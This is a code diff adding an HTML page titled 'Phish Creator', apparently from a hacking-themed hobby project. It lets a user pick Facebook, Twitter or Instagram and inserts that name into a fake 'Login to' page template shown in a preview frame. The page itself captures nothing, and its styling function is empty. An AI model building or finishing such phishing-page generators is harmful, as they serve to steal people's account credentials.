@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Phish Creator</title>
+	<link rel="stylesheet" type="text/css" href="../../../hackStyle/hack.css">
+    <link rel="stylesheet" type="text/css" href="../../../hackStyle/effects.css">
+    <style type="text/css">
+    	#preview{
+    		display: inline-block;
+    		position: absolute;
+    		right: 0;
+    		width: 50vw;
+    		height: 25vw;
+    		margin: 0;
+    		padding: 0;
+    	}
+    </style>
+</head>
+<body>
+<iframe id="preview"></iframe>
+<div id="wizard">
+	<form>
+		<label>Choose the Website you want to memic:</label>
+		<input type="radio" name="memic" onchange="websiteIs('Facebook')">Facebook
+		<input type="radio" name="memic" onchange="websiteIs('Twitter')">Twitter
+		<input type="radio" name="memic" onchange="websiteIs('Instagram')">Instagram
+	</form>
+</div>
+<script type="text/javascript" src="store.js"></script>
+<script type="text/javascript">
+	var preview = document.getElementById('preview')
+	preview.srcdoc=PhishHTML
+	var lastUsedwebsiteName = '{{title}}'
+	var lastUsedwebsiteMsg  = '{{message}}'
+	websiteIs = (websiteName)=>{
+		var t = preview.srcdoc
+		console.log(preview.srcdoc)
+		preview.srcdoc = preview.srcdoc.replace(lastUsedwebsiteName,websiteName)
+		preview.srcdoc = preview.srcdoc.replace(lastUsedwebsiteMsg, 'Login to '+websiteName)	
+		console.log(preview.srcdoc)
+		console.log(t == preview.srcdoc)
+		lastUsedwebsiteName = websiteName
+		lastUsedwebsiteMsg = 'Login to ' + websiteName
+		stylize(websiteName)
+}
+
+	stylize = (websiteName)=>{
+
+	}
+</script>
+</body>
+</html>
